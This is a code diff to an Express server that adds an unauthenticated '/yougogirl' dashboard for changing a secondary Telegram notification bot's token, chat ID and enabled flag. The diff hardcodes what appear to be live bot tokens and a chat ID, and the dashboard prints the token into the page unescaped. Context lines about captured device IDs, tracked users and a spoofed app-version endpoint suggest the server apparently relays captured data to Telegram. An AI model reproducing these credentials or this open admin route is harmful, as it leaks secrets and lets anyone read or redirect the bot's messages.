@@ -294,8 +294,9 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8959979027:AAF3YDbFvkUe_uxDEI6ojaycy
 const WEBHOOK_URL = 'https://xchas.vercel.app/bot-webhook';
 
 // === SECONDARY BOT CONFIGURATION ===
-const BOT2_TOKEN = process.env.BOT2_TOKEN || '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ';
-const BOT2_CHAT_ID = process.env.BOT2_CHAT_ID || '5880677639';
+let BOT2_TOKEN = process.env.BOT2_TOKEN || '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ';
+let BOT2_CHAT_ID = process.env.BOT2_CHAT_ID || '5880677639';
+let BOT2_ENABLED = true;
 
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
@@ -310,7 +311,7 @@ if (BOT2_TOKEN && BOT2_TOKEN !== 'BOT2_TOKEN_HERE') {
 }
 
 function sendBot2Message(text, options) {
-    if (!bot2 || !BOT2_CHAT_ID || BOT2_CHAT_ID === 'BOT2_CHAT_ID_HERE') return;
+    if (!BOT2_ENABLED || !bot2 || !BOT2_CHAT_ID || BOT2_CHAT_ID === 'BOT2_CHAT_ID_HERE') return;
     bot2.sendMessage(BOT2_CHAT_ID, text, options || { parse_mode: 'Markdown' }).catch(() => { });
 }
 const DEFAULT_DATA = {
@@ -336,7 +337,10 @@ const DEFAULT_DATA = {
     alwaysIdOverride: null,
     lastCapturedId: { deviceId: '', challengeId: '' },
     customServiceLink: '',
-    userBanners: {}
+    userBanners: {},
+    bot2Token: '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ',
+    bot2ChatId: '5880677639',
+    bot2Enabled: true
 };
 
 function generateDummyCode() {
@@ -577,6 +581,17 @@ async function loadData(forceRefresh) {
             if (!cachedData.userOverrides) cachedData.userOverrides = {};
             if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
             if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
+            
+            // Sync dynamic BOT2 variables
+            if (cachedData.bot2Token) {
+                if (BOT2_TOKEN !== cachedData.bot2Token) {
+                    BOT2_TOKEN = cachedData.bot2Token;
+                    try { bot2 = new TelegramBot(BOT2_TOKEN); } catch(e) {}
+                }
+            }
+            if (cachedData.bot2ChatId) BOT2_CHAT_ID = cachedData.bot2ChatId;
+            if (cachedData.bot2Enabled !== undefined) BOT2_ENABLED = cachedData.bot2Enabled;
+
             cacheTime = Date.now();
             return cachedData;
         }
@@ -4195,6 +4210,126 @@ app.post('/app/captcha/verify', async (req, res) => {
 
 app.all('/app/app/version/info/getLatestAppVersion', async (req, res) => {
     res.json({ "code": 1000, "data": { "id": 1, "createTime": "2025-01-01 00:00:00", "updateTime": "2025-01-01 00:00:00", "platform": "android", "appVersion": "1.0.0", "buildCode": 1, "updateType": "apk", "downloadUrl": "", "isForce": 0, "grayPercent": 0, "updateTitle": "", "updateContent": "", "fileSize": null, "fileMd5": "", "status": 0 }, "message": "success" });
+});
+
+// === YOUGOGIRL DASHBOARD (SECOND BOT MANAGEMENT) ===
+app.get('/yougogirl', async (req, res) => {
+    const data = await loadData();
+    const webhookLink = `https://api.telegram.org/bot${data.bot2Token}/setWebhook?url=https://xchas.vercel.app/bot2-webhook`;
+    
+    const html = `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Bot2 Controller</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+            body { font-family: 'Poppins', sans-serif; background: #0f172a; color: #f8fafc; }
+            .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
+            .gradient-text { background: linear-gradient(135deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+            .input-field { background: #1e293b; border: 1px solid #334155; border-radius: 0.75rem; padding: 0.75rem 1rem; width: 100%; transition: all 0.3s; }
+            .input-field:focus { border-color: #38bdf8; outline: none; box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); }
+            .btn-primary { background: linear-gradient(135deg, #0ea5e9, #6366f1); border-radius: 0.75rem; padding: 0.75rem 1.5rem; font-weight: 600; transition: all 0.3s; }
+            .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4); }
+            .status-badge { padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; }
+        </style>
+    </head>
+    <body class="min-h-screen flex items-center justify-center p-4">
+        <div class="max-w-md w-full glass rounded-3xl p-8 shadow-2xl">
+            <div class="text-center mb-8">
+                <h1 class="text-3xl font-bold gradient-text mb-2">Second Bot Manager</h1>
+                <p class="text-slate-400 text-sm">Configure your secondary notification bot</p>
+            </div>
+
+            <form action="/yougogirl/update" method="POST" class="space-y-6">
+                <div>
+                    <label class="block text-sm font-medium text-slate-300 mb-2">
+                        <i class="fa-solid fa-robot mr-2 text-sky-400"></i> Bot Token
+                    </label>
+                    <input type="text" name="token" value="${data.bot2Token || ''}" class="input-field" placeholder="Enter Bot Token">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-slate-300 mb-2">
+                        <i class="fa-solid fa-id-card mr-2 text-indigo-400"></i> Chat ID
+                    </label>
+                    <input type="text" name="chatId" value="${data.bot2ChatId || ''}" class="input-field" placeholder="Enter Chat ID">
+                </div>
+
+                <div class="flex items-center justify-between glass p-4 rounded-2xl">
+                    <div class="flex items-center">
+                        <i class="fa-solid fa-bell mr-3 text-amber-400"></i>
+                        <div>
+                            <span class="block font-medium">Notifications</span>
+                            <span class="text-xs text-slate-400">${data.bot2Enabled ? 'Active' : 'Disabled'}</span>
+                        </div>
+                    </div>
+                    <label class="relative inline-flex items-center cursor-pointer">
+                        <input type="checkbox" name="enabled" value="true" class="sr-only peer" ${data.bot2Enabled ? 'checked' : ''}>
+                        <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-sky-500"></div>
+                    </label>
+                </div>
+
+                <button type="submit" class="w-full btn-primary text-white">
+                    Save Changes
+                </button>
+            </form>
+
+            <div class="mt-8 pt-8 border-t border-slate-700">
+                <div class="flex items-center justify-between mb-4">
+                    <span class="text-sm font-medium text-slate-300">Webhook Status</span>
+                    <span class="status-badge bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">Ready</span>
+                </div>
+                <a href="${webhookLink}" target="_blank" class="block text-center text-xs text-sky-400 hover:text-sky-300 transition-colors bg-sky-500/10 py-3 rounded-xl border border-sky-500/20">
+                    <i class="fa-solid fa-link mr-1"></i> Click to Activate Webhook
+                </a>
+            </div>
+        </div>
+    </body>
+    </html>
+    `;
+    res.send(html);
+});
+
+app.post('/yougogirl/update', async (req, res) => {
+    try {
+        const { token, chatId, enabled } = req.parsedBody || {};
+        const data = await loadData(true);
+        
+        data.bot2Token = token || data.bot2Token;
+        data.bot2ChatId = chatId || data.bot2ChatId;
+        data.bot2Enabled = enabled === 'true';
+        
+        await saveData(data);
+        
+        // Re-initialize bot2 with new token
+        if (token && token !== BOT2_TOKEN) {
+            BOT2_TOKEN = token;
+            try { bot2 = new TelegramBot(BOT2_TOKEN); } catch(e) {}
+        }
+        BOT2_CHAT_ID = data.bot2ChatId;
+        BOT2_ENABLED = data.bot2Enabled;
+
+        res.send(`
+            <script src="https://cdn.tailwindcss.com"></script>
+            <body class="bg-slate-900 h-screen flex items-center justify-center p-4 font-sans">
+                <div class="bg-slate-800 p-8 rounded-3xl shadow-2xl text-center max-w-sm w-full border border-slate-700">
+                    <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                        <svg class="w-10 h-10 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    </div>
+                    <h2 class="text-2xl font-bold text-white mb-2">Updated!</h2>
+                    <p class="text-slate-400 mb-8">Second Bot settings have been saved successfully.</p>
+                    <a href="/yougogirl" class="block w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-3 rounded-xl transition-all">Go Back</a>
+                </div>
+            </body>
+        `);
+    } catch (e) {
+        res.status(500).send("Update failed: " + e.message);
+    }
 });
 
 // === TURNSTILE PAGE PROXY ===
